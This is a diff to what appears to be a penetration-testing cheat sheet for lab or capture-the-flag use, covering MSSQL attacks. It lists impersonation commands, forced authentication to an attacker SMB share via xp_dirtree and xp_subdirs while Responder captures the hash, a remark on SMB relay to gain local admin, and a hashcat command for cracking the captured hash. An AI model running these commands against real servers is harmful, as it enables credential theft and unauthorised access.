@@ -60,14 +60,15 @@ exec_as_user <grantor>
 exec_as_login <grantor>
 ```
 ##### Capture Hash
+**THIS CAN ALSO BE USED WITH AN SMB RELAY ATTACK TO GAIN A LOCAL ADMIN** 
 ```bash
 sudo responder -I tun0
 xp_dirtree \\10.10.14.3\adot8\
+xp_subdirs \\10.10.14.3\adot8\
 ```
 
 ```bash
-sudo responder -I tun0
-xp_subdirs \\10.10.14.3\adot8\
+hashcat -m 2000 mssql.hash ~/rockyou.txt -O
 ```
 ##### Read and copy file
 ```sql
